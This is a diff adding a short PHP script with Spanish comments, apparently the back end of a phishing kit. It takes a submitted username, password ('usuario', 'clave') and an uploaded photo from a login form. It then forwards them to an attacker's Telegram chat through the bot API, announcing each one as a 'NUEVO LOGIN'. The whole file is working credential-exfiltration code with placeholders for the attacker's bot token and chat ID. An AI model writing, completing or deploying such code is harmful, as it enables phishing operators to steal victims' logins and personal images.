@@ -1,0 +1,30 @@
+<?php
+$botToken = "PON_AQUI_TU_TOKEN";
+$chatId = "PON_AQUI_TU_CHAT_ID";
+
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $usuario = $_POST['usuario'];
+    $clave = $_POST['clave'];
+    $foto = $_FILES['foto'];
+
+    $mensaje = "🚨 NUEVO LOGIN 🚨\nUsuario: " . $usuario . "\nClave: " . $clave;
+
+    // Enviar mensaje
+    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($mensaje));
+
+    // Enviar foto
+    $url = "https://api.telegram.org/bot$botToken/sendPhoto";
+    $post = [
+        'chat_id' => $chatId,
+        'photo' => new CURLFile($foto['tmp_name'], $foto['type'], $foto['name'])
+    ];
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
+    curl_exec($ch);
+    curl_close($ch);
+
+    echo "Listo, se envio todo";
+}
+?>
